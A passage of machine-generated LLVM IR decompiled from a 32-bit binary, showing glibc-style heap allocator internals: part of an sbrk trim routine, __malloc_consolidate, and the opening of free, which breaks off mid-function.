
dec_label_pc_8050546:                             ; preds = %entry
  %v1_805054b = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805054b, i32* %edi.global-to-local, align 4
  %v0_8050555 = load i32, i32* @esi, align 4
  store i32 %v0_8050555, i32* %eax.global-to-local, align 4
  %v1_8050557 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050557 = add i32 %v1_8050557, 44
  %v3_8050557 = inttoptr i32 %v2_8050557 to i32*
  %v4_8050557 = load i32, i32* %v3_8050557, align 4
  %v5_8050557 = add i32 %v4_8050557, %v0_8050555
  store i32 %v5_8050557, i32* %eax.global-to-local, align 4
  %v12_805055a = icmp eq i32 %v1_805054b, %v5_8050557
  %v1_805055c = icmp eq i1 %v12_805055a, false
  br i1 %v1_805055c, label %dec_label_pc_805059b, label %dec_label_pc_805055e

dec_label_pc_805055e:                             ; preds = %dec_label_pc_8050546
  %v1_8050561 = sub i32 0, %v4_805053f
  store i32 %v1_8050561, i32* @ebx, align 4
  %v1_8050564 = call i32 @__GI_sbrk(i32 %v1_8050561)
  store i32 %v1_8050564, i32* %eax.global-to-local, align 4
  %v1_8050570 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050570, i32* %eax.global-to-local, align 4
  %v10_8050578 = icmp eq i32 %v1_8050570, -1
  br i1 %v10_8050578, label %dec_label_pc_805059b, label %dec_label_pc_805057d

dec_label_pc_805057d:                             ; preds = %dec_label_pc_805055e
  %v0_805057d = load i32, i32* %edi.global-to-local, align 4
  %v2_805057f = sub i32 %v0_805057d, %v1_8050570
  %v12_805057f = icmp eq i32 %v2_805057f, 0
  store i32 %v2_805057f, i32* @ecx, align 4
  br i1 %v12_805057f, label %dec_label_pc_805059b, label %dec_label_pc_8050583

dec_label_pc_8050583:                             ; preds = %dec_label_pc_805057d
  %v0_8050583 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050583 = add i32 %v0_8050583, 44
  %v2_8050583 = inttoptr i32 %v1_8050583 to i32*
  %v3_8050583 = load i32, i32* %v2_8050583, align 4
  store i32 %v3_8050583, i32* %eax.global-to-local, align 4
  %v0_8050586 = load i32, i32* @esi, align 4
  %v2_8050586 = sub i32 %v0_8050586, %v2_805057f
  store i32 %v2_8050586, i32* %esi.global-to-local, align 4
  %v1_8050588 = add i32 %v0_8050583, 872
  %v2_8050588 = inttoptr i32 %v1_8050588 to i32*
  %v3_8050588 = load i32, i32* %v2_8050588, align 4
  %v5_8050588 = sub i32 %v3_8050588, %v2_805057f
  store i32 %v5_8050588, i32* %v2_8050588, align 4
  %v0_805058e = load i32, i32* %esi.global-to-local, align 4
  %v1_805058e = or i32 %v0_805058e, 1
  store i32 %v1_805058e, i32* %esi.global-to-local, align 4
  %v1_8050591 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050591 = add i32 %v1_8050591, 4
  %v3_8050591 = inttoptr i32 %v2_8050591 to i32*
  store i32 %v1_805058e, i32* %v3_8050591, align 4
  br label %dec_label_pc_805059d

dec_label_pc_805059b:                             ; preds = %dec_label_pc_805057d, %dec_label_pc_805055e, %dec_label_pc_8050546, %entry
  br label %dec_label_pc_805059d

dec_label_pc_805059d:                             ; preds = %dec_label_pc_8050583, %dec_label_pc_805059b
  %storemerge = phi i32 [ 1, %dec_label_pc_8050583 ], [ 0, %dec_label_pc_805059b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805051c, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050570, { 1, 0, 2 }
  uselistorder i32 %v4_805053f, { 1, 2, 0 }
  uselistorder i32 %v3_8050521, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8050519, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805059d, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_80505a6 = load i32, i32* @edi, align 4
  %v0_80505a7 = load i32, i32* @esi, align 4
  %v0_80505a8 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80505b0 = load i32, i32* %arg1, align 4
  store i32 %v2_80505b0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80505b7 = icmp eq i32 %v2_80505b0, 0
  br i1 %v1_80505b7, label %dec_label_pc_80506e0.preheader, label %dec_label_pc_80505bf

dec_label_pc_80506e0.preheader:                   ; preds = %entry
  %v3_80506d5 = add i32 %tmp11, 44
  br label %dec_label_pc_80506d1

dec_label_pc_80505bf:                             ; preds = %entry
  %v1_80505c3 = and i32 %v2_80505b0, -3
  store i32 %v1_80505c3, i32* %arg1, align 4
  %v1_80505c8 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_80505d7 = add i32 %tmp11, 4
  store i32 %v1_80505d7, i32* %eax.global-to-local, align 4
  %v2_80505de = load i32, i32* %arg1, align 4
  %v2_80505e4 = udiv i32 %v2_80505de, 8
  %v2_80505e7 = mul nuw i32 %v2_80505e4, 4
  %v3_80505e7 = add i32 %tmp11, -4
  %v4_80505e7 = add i32 %v3_80505e7, %v2_80505e7
  store i32 %v4_80505e7, i32* %eax.global-to-local, align 4
  %v2_80506ae = add i32 %tmp11, 44
  %v3_80506ae = inttoptr i32 %v2_80506ae to i32*
  %v1_8050681 = add i32 %tmp11, 60
  %v2_8050681 = inttoptr i32 %v1_8050681 to i32*
  br label %dec_label_pc_80505ef

dec_label_pc_80505ef:                             ; preds = %dec_label_pc_80506c7, %dec_label_pc_80505bf
  %v0_80505fd = phi i32 [ %v1_80505d7, %dec_label_pc_80505bf ], [ %v4_80506c7, %dec_label_pc_80506c7 ]
  store i32 %v0_80505fd, i32* %eax.global-to-local, align 4
  %v1_80505f3 = inttoptr i32 %v0_80505fd to i32*
  %v2_80505f3 = load i32, i32* %v1_80505f3, align 4
  store i32 %v2_80505f3, i32* @ecx, align 4
  %v1_80505f5 = icmp eq i32 %v2_80505f3, 0
  br i1 %v1_80505f5, label %dec_label_pc_80506bd, label %dec_label_pc_80505fd

dec_label_pc_80505fd:                             ; preds = %dec_label_pc_80505ef
  store i32 0, i32* %v1_80505f3, align 4
  %v0_8050603.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050603

dec_label_pc_8050603:                             ; preds = %dec_label_pc_80506b1, %dec_label_pc_80505fd
  %v0_8050620 = phi i32 [ %v3_8050603, %dec_label_pc_80506b1 ], [ %v0_8050603.pre, %dec_label_pc_80505fd ]
  %v1_8050603 = add i32 %v0_8050620, 8
  %v2_8050603 = inttoptr i32 %v1_8050603 to i32*
  %v3_8050603 = load i32, i32* %v2_8050603, align 4
  store i32 %v3_8050603, i32* %edx.global-to-local, align 4
  %v1_805060a = add i32 %v0_8050620, 4
  %v2_805060a = inttoptr i32 %v1_805060a to i32*
  %v3_805060a = load i32, i32* %v2_805060a, align 4
  store i32 %v3_805060a, i32* %eax.global-to-local, align 4
  %v1_805060f = and i32 %v3_805060a, -2
  store i32 %v1_805060f, i32* @edi, align 4
  %v2_8050612 = urem i32 %v3_805060a, 2
  %v3_8050612 = icmp eq i32 %v2_8050612, 0
  %v2_8050614 = add i32 %v1_805060f, %v0_8050620
  store i32 %v2_8050614, i32* @ebx, align 4
  %v1_8050617 = add i32 %v2_8050614, 4
  %v2_8050617 = inttoptr i32 %v1_8050617 to i32*
  %v3_8050617 = load i32, i32* %v2_8050617, align 4
  store i32 %v3_8050617, i32* %edx.global-to-local, align 4
  %v1_805061e = icmp eq i1 %v3_8050612, false
  br i1 %v1_805061e, label %dec_label_pc_8050640, label %dec_label_pc_8050620

dec_label_pc_8050620:                             ; preds = %dec_label_pc_8050603
  %v1_8050620 = inttoptr i32 %v0_8050620 to i32*
  %v2_8050620 = load i32, i32* %v1_8050620, align 4
  store i32 %v2_8050620, i32* %ebp.global-to-local, align 4
  %v2_8050624 = sub i32 %v0_8050620, %v2_8050620
  store i32 %v2_8050624, i32* %eax.global-to-local, align 4
  %v1_8050626 = add i32 %v2_8050624, 8
  %v2_8050626 = inttoptr i32 %v1_8050626 to i32*
  %v3_8050626 = load i32, i32* %v2_8050626, align 4
  store i32 %v3_8050626, i32* @esi, align 4
  %v1_8050629 = add i32 %v2_8050624, 12
  %v2_8050629 = inttoptr i32 %v1_8050629 to i32*
  %v3_8050629 = load i32, i32* %v2_8050629, align 4
  store i32 %v3_8050629, i32* %edx.global-to-local, align 4
  %v1_805062c = add i32 %v3_8050626, 12
  %v2_805062c = inttoptr i32 %v1_805062c to i32*
  %v3_805062c = load i32, i32* %v2_805062c, align 4
  store i32 %v3_805062c, i32* @ecx, align 4
  %v12_805062f = icmp eq i32 %v3_805062c, %v2_8050624
  %v1_8050631 = icmp eq i1 %v12_805062f, false
  br i1 %v1_8050631, label %dec_label_pc_8050670, label %dec_label_pc_8050633

dec_label_pc_8050633:                             ; preds = %dec_label_pc_8050620
  %v1_8050633 = add i32 %v3_8050629, 8
  %v2_8050633 = inttoptr i32 %v1_8050633 to i32*
  %v3_8050633 = load i32, i32* %v2_8050633, align 4
  %v15_8050633 = icmp eq i32 %v3_8050633, %v3_805062c
  %v1_8050636 = icmp eq i1 %v15_8050633, false
  br i1 %v1_8050636, label %dec_label_pc_8050670, label %dec_label_pc_8050638

dec_label_pc_8050638:                             ; preds = %dec_label_pc_8050633
  %v2_8050638 = add i32 %v2_8050620, %v1_805060f
  store i32 %v2_8050638, i32* @edi, align 4
  store i32 %v3_8050629, i32* %v2_805062c, align 4
  %v0_805063d = load i32, i32* @esi, align 4
  %v1_805063d = load i32, i32* %edx.global-to-local, align 4
  %v2_805063d = add i32 %v1_805063d, 8
  %v3_805063d = inttoptr i32 %v2_805063d to i32*
  store i32 %v0_805063d, i32* %v3_805063d, align 4
  %v0_805064b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050640

dec_label_pc_8050640:                             ; preds = %dec_label_pc_8050603, %dec_label_pc_8050638
  %v1_8050654 = phi i32 [ %v2_8050614, %dec_label_pc_8050603 ], [ %v0_805064b.pre, %dec_label_pc_8050638 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050648 = and i32 %v3_8050617, -4
  store i32 %v1_8050648, i32* %ebp.global-to-local, align 4
  %v4_805064b = load i32, i32* %v3_80506ae, align 4
  %v15_805064b = icmp eq i32 %v1_8050654, %v4_805064b
  br i1 %v15_805064b, label %dec_label_pc_80506a1, label %dec_label_pc_8050650

dec_label_pc_8050650:                             ; preds = %dec_label_pc_8050640
  %v2_8050650 = add i32 %v1_8050654, 4
  %v3_8050650 = add i32 %v2_8050650, %v1_8050648
  %v4_8050650 = inttoptr i32 %v3_8050650 to i32*
  %v5_8050650 = load i32, i32* %v4_8050650, align 4
  store i32 %v5_8050650, i32* %eax.global-to-local, align 4
  %v3_8050654 = inttoptr i32 %v2_8050650 to i32*
  store i32 %v1_8050648, i32* %v3_8050654, align 4
  %v0_8050657 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050657 = urem i32 %v0_8050657, 2
  %v2_8050657 = icmp eq i32 %v1_8050657, 0
  store i32 %v1_8050657, i32* %eax.global-to-local, align 4
  %v1_805065c = icmp eq i1 %v2_8050657, false
  br i1 %v1_805065c, label %dec_label_pc_805067d, label %dec_label_pc_805065e

dec_label_pc_805065e:                             ; preds = %dec_label_pc_8050650
  %v0_805065e = load i32, i32* @ebx, align 4
  %v1_805065e = add i32 %v0_805065e, 8
  %v2_805065e = inttoptr i32 %v1_805065e to i32*
  %v3_805065e = load i32, i32* %v2_805065e, align 4
  store i32 %v3_805065e, i32* @edx, align 4
  %v1_8050661 = add i32 %v0_805065e, 12
  %v2_8050661 = inttoptr i32 %v1_8050661 to i32*
  %v3_8050661 = load i32, i32* %v2_8050661, align 4
  store i32 %v3_8050661, i32* %eax.global-to-local, align 4
  %v1_8050664 = add i32 %v3_805065e, 12
  %v2_8050664 = inttoptr i32 %v1_8050664 to i32*
  %v3_8050664 = load i32, i32* %v2_8050664, align 4
  store i32 %v3_8050664, i32* @esi, align 4
  %v12_8050667 = icmp eq i32 %v3_8050664, %v0_805065e
  %v1_8050669 = icmp eq i1 %v12_8050667, false
  br i1 %v1_8050669, label %dec_label_pc_8050670, label %dec_label_pc_805066b

dec_label_pc_805066b:                             ; preds = %dec_label_pc_805065e
  %v1_805066b = add i32 %v3_8050661, 8
  %v2_805066b = inttoptr i32 %v1_805066b to i32*
  %v3_805066b = load i32, i32* %v2_805066b, align 4
  %v15_805066b = icmp eq i32 %v3_805066b, %v3_8050664
  br i1 %v15_805066b, label %dec_label_pc_8050675, label %dec_label_pc_8050670

dec_label_pc_8050670:                             ; preds = %dec_label_pc_805066b, %dec_label_pc_805065e, %dec_label_pc_8050633, %dec_label_pc_8050620
  %v0_8050670 = call i32 @abort()
  store i32 %v0_8050670, i32* %eax.global-to-local, align 4
  %v1_8050677.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050675

dec_label_pc_8050675:                             ; preds = %dec_label_pc_805066b, %dec_label_pc_8050670
  %v1_8050677 = phi i32 [ %v3_805065e, %dec_label_pc_805066b ], [ %v1_8050677.pre, %dec_label_pc_8050670 ]
  %v0_8050677 = phi i32 [ %v3_8050661, %dec_label_pc_805066b ], [ %v0_8050670, %dec_label_pc_8050670 ]
  %v0_8050675 = load i32, i32* @edi, align 4
  %v1_8050675 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050675 = add i32 %v1_8050675, %v0_8050675
  store i32 %v2_8050675, i32* @edi, align 4
  %v2_8050677 = add i32 %v1_8050677, 12
  %v3_8050677 = inttoptr i32 %v2_8050677 to i32*
  store i32 %v0_8050677, i32* %v3_8050677, align 4
  %v0_805067a = load i32, i32* @edx, align 4
  %v1_805067a = load i32, i32* %eax.global-to-local, align 4
  %v2_805067a = add i32 %v1_805067a, 8
  %v3_805067a = inttoptr i32 %v2_805067a to i32*
  store i32 %v0_805067a, i32* %v3_805067a, align 4
  br label %dec_label_pc_805067d

dec_label_pc_805067d:                             ; preds = %dec_label_pc_8050650, %dec_label_pc_8050675
  store i32 %v1_80505c8, i32* %eax.global-to-local, align 4
  %v3_8050681 = load i32, i32* %v2_8050681, align 4
  store i32 %v3_8050681, i32* @edx, align 4
  %v0_8050684 = load i32, i32* @ecx, align 4
  store i32 %v0_8050684, i32* %v2_8050681, align 4
  %v0_8050687 = load i32, i32* @edi, align 4
  %v1_8050689 = or i32 %v0_8050687, 1
  %v1_805068c = load i32, i32* @ecx, align 4
  %v2_805068c = add i32 %v1_805068c, 4
  %v3_805068c = inttoptr i32 %v2_805068c to i32*
  store i32 %v1_8050689, i32* %v3_805068c, align 4
  %v0_805068f = load i32, i32* @ecx, align 4
  %v1_805068f = load i32, i32* @edx, align 4
  %v2_805068f = add i32 %v1_805068f, 12
  %v3_805068f = inttoptr i32 %v2_805068f to i32*
  store i32 %v0_805068f, i32* %v3_805068f, align 4
  store i32 %v1_80505c8, i32* %eax.global-to-local, align 4
  %v0_8050696 = load i32, i32* @edx, align 4
  %v1_8050696 = load i32, i32* @ecx, align 4
  %v2_8050696 = add i32 %v1_8050696, 8
  %v3_8050696 = inttoptr i32 %v2_8050696 to i32*
  store i32 %v0_8050696, i32* %v3_8050696, align 4
  %v0_8050699 = load i32, i32* @edi, align 4
  %v1_8050699 = load i32, i32* @ecx, align 4
  %v3_8050699 = add i32 %v1_8050699, %v0_8050699
  %v4_8050699 = inttoptr i32 %v3_8050699 to i32*
  store i32 %v0_8050699, i32* %v4_8050699, align 4
  %v0_805069c = load i32, i32* %eax.global-to-local, align 4
  %v1_805069c = load i32, i32* @ecx, align 4
  %v2_805069c = add i32 %v1_805069c, 12
  %v3_805069c = inttoptr i32 %v2_805069c to i32*
  store i32 %v0_805069c, i32* %v3_805069c, align 4
  br label %dec_label_pc_80506b1

dec_label_pc_80506a1:                             ; preds = %dec_label_pc_8050640
  %v0_80506a1 = load i32, i32* @edi, align 4
  %v2_80506a1 = add i32 %v0_80506a1, %v1_8050648
  %v1_80506a4 = or i32 %v2_80506a1, 1
  store i32 %v1_80506a4, i32* %eax.global-to-local, align 4
  %v1_80506a7 = load i32, i32* @ecx, align 4
  %v2_80506a7 = add i32 %v1_80506a7, 4
  %v3_80506a7 = inttoptr i32 %v2_80506a7 to i32*
  store i32 %v1_80506a4, i32* %v3_80506a7, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_80506ae = load i32, i32* @ecx, align 4
  store i32 %v0_80506ae, i32* %v3_80506ae, align 4
  br label %dec_label_pc_80506b1

dec_label_pc_80506b1:                             ; preds = %dec_label_pc_805067d, %dec_label_pc_80506a1
  store i32 %v3_8050603, i32* @ecx, align 4
  %v1_80506b5 = icmp eq i32 %v3_8050603, 0
  %v1_80506b7 = icmp eq i1 %v1_80506b5, false
  br i1 %v1_80506b7, label %dec_label_pc_8050603, label %dec_label_pc_80506bd

dec_label_pc_80506bd:                             ; preds = %dec_label_pc_80506b1, %dec_label_pc_80505ef
  store i32 %v4_80505e7, i32* @ecx, align 4
  %v15_80506c1 = icmp eq i32 %v0_80505fd, %v4_80505e7
  br i1 %v15_80506c1, label %dec_label_pc_8050745, label %dec_label_pc_80506c7

dec_label_pc_80506c7:                             ; preds = %dec_label_pc_80506bd
  %v4_80506c7 = add i32 %v0_80505fd, 4
  br label %dec_label_pc_80505ef

dec_label_pc_80506d1:                             ; preds = %dec_label_pc_80506e0.preheader, %dec_label_pc_80506d1
  %v1_80506d520 = phi i32 [ 1, %dec_label_pc_80506e0.preheader ], [ %v0_80506e0.pre, %dec_label_pc_80506d1 ]
  %v2_80506d5 = mul i32 %v1_80506d520, 8
  %v4_80506d5 = add i32 %v3_80506d5, %v2_80506d5
  store i32 %v4_80506d5, i32* %eax.global-to-local, align 4
  %v1_80506d9 = add i32 %v1_80506d520, 1
  store i32 %v1_80506d9, i32* %edx.global-to-local, align 4
  %v2_80506da = add i32 %v4_80506d5, 12
  %v3_80506da = inttoptr i32 %v2_80506da to i32*
  store i32 %v4_80506d5, i32* %v3_80506da, align 4
  %v0_80506dd = load i32, i32* %eax.global-to-local, align 4
  %v2_80506dd = add i32 %v0_80506dd, 8
  %v3_80506dd = inttoptr i32 %v2_80506dd to i32*
  store i32 %v0_80506dd, i32* %v3_80506dd, align 4
  %v0_80506e0.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_80506e3 = icmp sgt i32 %v0_80506e0.pre, 95
  br i1 %v7_80506e3, label %dec_label_pc_80506e5, label %dec_label_pc_80506d1

dec_label_pc_80506e5:                             ; preds = %dec_label_pc_80506d1
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80506e9 = add i32 %tmp11, 864
  %v2_80506e9 = inttoptr i32 %v1_80506e9 to i32*
  %v3_80506e9 = load i32, i32* %v2_80506e9, align 4
  %v4_80506e9 = or i32 %v3_80506e9, 1
  store i32 %v4_80506e9, i32* %v2_80506e9, align 4
  %v0_80506f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506f0 = add i32 %v0_80506f0, 840
  %v2_80506f0 = inttoptr i32 %v1_80506f0 to i32*
  store i32 0, i32* %v2_80506f0, align 4
  %v0_80506fa = load i32, i32* %eax.global-to-local, align 4
  %v1_80506fa = add i32 %v0_80506fa, 852
  %v2_80506fa = inttoptr i32 %v1_80506fa to i32*
  store i32 65536, i32* %v2_80506fa, align 4
  %v0_8050704 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050704 = add i32 %v0_8050704, 844
  %v2_8050704 = inttoptr i32 %v1_8050704 to i32*
  store i32 262144, i32* %v2_8050704, align 4
  %v0_805070e = load i32, i32* %eax.global-to-local, align 4
  %v1_805070e = add i32 %v0_805070e, 836
  %v2_805070e = inttoptr i32 %v1_805070e to i32*
  store i32 262144, i32* %v2_805070e, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_805071f = load i32, i32* %arg1, align 4
  %v1_8050721 = urem i32 %v2_805071f, 4
  %v1_8050724 = or i32 %v1_8050721, 72
  store i32 %v1_8050724, i32* %arg1, align 4
  %v0_8050729 = load i32, i32* @edx, align 4
  %v1_805072b = add i32 %v0_8050729, 52
  store i32 %v1_805072b, i32* %eax.global-to-local, align 4
  %v2_805072e = add i32 %v0_8050729, 44
  %v3_805072e = inttoptr i32 %v2_805072e to i32*
  store i32 %v1_805072b, i32* %v3_805072e, align 4
  %v1_8050733 = call i32 @sysconf(i32 30)
  store i32 %v1_8050733, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_805073f = add i32 %tmp11, 860
  %v3_805073f = inttoptr i32 %v2_805073f to i32*
  store i32 %v1_8050733, i32* %v3_805073f, align 4
  br label %dec_label_pc_8050745

dec_label_pc_8050745:                             ; preds = %dec_label_pc_80506bd, %dec_label_pc_80506e5
  store i32 %v0_80505a8, i32* @ebx, align 4
  store i32 %v0_80505a7, i32* @esi, align 4
  store i32 %v0_80505a6, i32* @edi, align 4
  %v0_805074c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805074c

; uselistorder directives
  uselistorder i32 %v0_80506dd, { 1, 0 }
  uselistorder i32 %v0_8050699, { 1, 0 }
  uselistorder i32 %v1_8050657, { 1, 0 }
  uselistorder i32 %v2_8050650, { 1, 0 }
  uselistorder i32 %v1_8050648, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050654, { 1, 0 }
  uselistorder i32 %v3_8050603, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8050620, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80505fd, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80506ae, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 (i32)* @sysconf, { 1, 0 }
  uselistorder label %dec_label_pc_8050745, { 1, 0 }
  uselistorder label %dec_label_pc_80506d1, { 1, 0 }
  uselistorder label %dec_label_pc_80506b1, { 1, 0 }
  uselistorder label %dec_label_pc_805067d, { 1, 0 }
  uselistorder label %dec_label_pc_8050675, { 1, 0 }
  uselistorder label %dec_label_pc_8050640, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805074d = load i32, i32* @ebp, align 4
  %v0_805074e = load i32, i32* @edi, align 4
  %v0_805074f = load i32, i32* @esi, align 4
  %v0_8050750 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050758 = icmp eq i32 %arg1, 0
  br i1 %v1_8050758, label %dec_label_pc_80508e1, label %dec_label_pc_8050760

dec_label_pc_8050760:                             ; preds = %entry
  %v2_805076b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805076b, i32* @eax, align 4
  %v2_8050770 = call i32 @__pthread_return_void(i32 %v2_805076b, i32 134550239)
  store i32 %v2_8050770, i32* %eax.global-to-local, align 4
  %v1_805077c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80557d0.117 to i32))
  %v1_8050781 = add i32 %arg1, -8
  store i32 %v1_8050781, i32* @ecx, align 4
  %v0_8050784 = load i8, i8* @global_var_805ba20.118, align 1
  %v1_8050784 = sext i8 %v0_8050784 to i32
  store i32 %v1_8050784, i32* %eax.global-to-local, align 4
  %v1_8050789 = add i32 %arg1, -4
  %v2_8050789 = inttoptr i32 %v1_8050789 to i32*
  %v3_8050789 = load i32, i32* %v2_8050789, align 4
  store i32 %v3_8050789, i32* @edx, align 4
  %v1_8050791 = and i32 %v3_8050789, -4
  %v4_8050791 = trunc i32 %v1_8050791 to i8
  store i32 %v1_8050791, i32* @ebx, align 4
  %v8_8050796 = icmp ugt i8 %v4_8050791, %v0_8050784
  br i1 %v8_8050796, label %dec_label_pc_80507b8, label %dec_label_pc_8050798

dec_label_pc_8050798:                             ; preds = %dec_label_pc_8050760
  %v1_8050798 = or i32 %v1_8050784, 3
  %v3_8050798 = trunc i32 %v1_8050798 to i8
  store i32 %v1_8050798, i32* %eax.global-to-local, align 4
  %v2_805079b = udiv i32 %v3_8050789, 8
  store i8 %v3_8050798, i8* @global_var_805ba20.118, align 32
  %v1_80507a3 = mul nuw i32 %v2_805079b, 4
  %v2_80507a3 = add i32 %v1_80507a3, ptrtoint (i8* @global_var_805ba20.118 to i32)
  store i32 %v2_80507a3, i32* @edx, align 4
  %v1_80507aa = add i32 %v1_80507a3, add (i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32 -4)
  %v2_80507aa = inttoptr i32 %v1_80507aa to i32*
  %v3_80507aa = load i32, i32* %v2_80507aa, align 4
  store i32 %v3_80507aa, i32* %eax.global-to-local, align 4
  %v3_80507ad = inttoptr i32 %arg1 to i32*
  store i32 %v3_80507aa, i32* %v3_80507ad, align 4
  %v0_80507b0 = load i32, i32* @ecx, align 4
  %v1_80507b0 = load i32, i32* @edx, align 4
  %v2_80507b0 = add i32 %v1_80507b0, -4
  %v3_80507b0 = inttoptr i32 %v2_80507b0 to i32*
  store i32 %v0_80507b0, i32* %v3_80507b0, align 4
  br label %dec_label_pc_80508d0

dec_label_pc_80507b8:                             ; preds = %dec_label_pc_8050760
  %v2_80507b8 = and i32 %v3_8050789, 2
  %v3_80507b8 = icmp eq i32 %v2_80507b8, 0
  %v1_80507bb = icmp eq i1 %v3_80507b8, false
  br i1 %v1_80507bb, label %dec_label_pc_80508b0, label %dec_label_pc_80507c1

dec_label_pc_80507c1:                             ; preds = %dec_label_pc_80507b8
  %v1_80507c1 = or i32 %v1_8050784, 1
  %v3_80507c1 = trunc i32 %v1_80507c1 to i8
  store i32 %v1_80507c1, i32* %eax.global-to-local, align 4
  store i8 %v3_80507c1, i8* @global_var_805ba20.118, align 32
  %v2_80507c9 = add i32 %v1_8050791, %v1_8050781
  store i32 %v2_80507c9, i32* @esi, align 4
  %v1_80507cc = add i32 %v2_80507c9, 4
  %v2_80507cc = inttoptr i32 %v1_80507cc to i32*
  %v3_80507cc = load i32, i32* %v2_80507cc, align 4
  store i32 %v3_80507cc, i32* %eax.global-to-local, align 4
  %v2_80507d3 = inttoptr i32 %v1_8050789 to i8*
  %v3_80507d3 = load i8, i8* %v2_80507d3, align 1
  %v4_80507d3 = urem i8 %v3_80507d3, 2
  %v5_80507d3 = icmp eq i8 %v4_80507d3, 0
  %v1_80507d7 = icmp eq i1 %v5_80507d3, false
  br i1 %v1_80507d7, label %dec_label_pc_80507fa, label %dec_label_pc_80507d9

dec_label_pc_80507d9:                             ; preds = %dec_label_pc_80507c1
  %v2_80507d9 = inttoptr i32 %v1_8050781 to i32*
  %v3_80507d9 = load i32, i32* %v2_80507d9, align 4
  store i32 %v3_80507d9, i32* @ebp, align 4
  %v2_80507de = sub i32 %v1_8050781, %v3_80507d9
  store i32 %v2_80507de, i32* %eax.global-to-local, align 4
  %v1_80507e0 = add i32 %v2_80507de, 8
  %v2_80507e0 = inttoptr i32 %v1_80507e0 to i32*
  %v3_80507e0 = load i32, i32* %v2_80507e0, align 4
  store i32 %v3_80507e0, i32* @edi, align 4
  %v1_80507e3 = add i32 %v2_80507de, 12
  %v2_80507e3 = inttoptr i32 %v1_80507e3 to i32*
  %v3_80507e3 = load i32, i32* %v2_80507e3, align 4
  store i32 %v3_80507e3, i32* @edx, align 4
  %v1_80507e6 = add i32 %v3_80507e0, 12
  %v2_80507e6 = inttoptr i32 %v1_80507e6 to i32*
  %v3_80507e6 = load i32, i32* %v2_80507e6, align 4
  store i32 %v3_80507e6, i32* @ecx, align 4
  %v12_80507e9 = icmp eq i32 %v3_80507e6, %v2_80507de
  %v1_80507eb = icmp eq i1 %v12_80507e9, false
  br i1 %v1_80507eb, label %dec_label_pc_8050829, label %dec_label_pc_80507ed

dec_label_pc_80507ed:                             ; preds = %dec_label_pc_80507d9
  %v1_80507ed = add i32 %v3_80507e3, 8
  %v2_80507ed = inttoptr i32 %v1_80507ed to i32*
  %v3_80507ed = load i32, i32* %v2_80507ed, align 4
  %v15_80507ed = icmp eq i32 %v3_80507ed, %v3_80507e6
  %v1_80507f0 = icmp eq i1 %v15_80507ed, false
  br i1 %v1_80507f0, label %dec_label_pc_8050829, label %dec_label_pc_80507f2

dec_label_pc_80507f2:                             ; preds = %dec_label_pc_80507ed
  %v2_80507f2 = add i32 %v3_80507d9, %v1_8050791
  store i32 %v2_80507f2, i32* @ebx, align 4
  store i32 %v3_80507e3, i32* %v2_80507e6, align 4
  %v0_80507f7 = load i32, i32* @edi, align 4
  %v1_80507f7 = load i32, i32* @edx, align 4
  %v2_80507f7 = add i32 %v1_80507f7, 8
  %v3_80507f7 = inttoptr i32 %v2_80507f7 to i32*
  store i32 %v0_80507f7, i32* %v3_80507f7, align 4
  %v0_8050801.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80507fa

dec_label_pc_80507fa:                             ; preds = %dec_label_pc_80507c1, %dec_label_pc_80507f2
  %v1_805080d = phi i32 [ %v2_80507c9, %dec_label_pc_80507c1 ], [ %v0_8050801.pre, %dec_label_pc_80507f2 ]
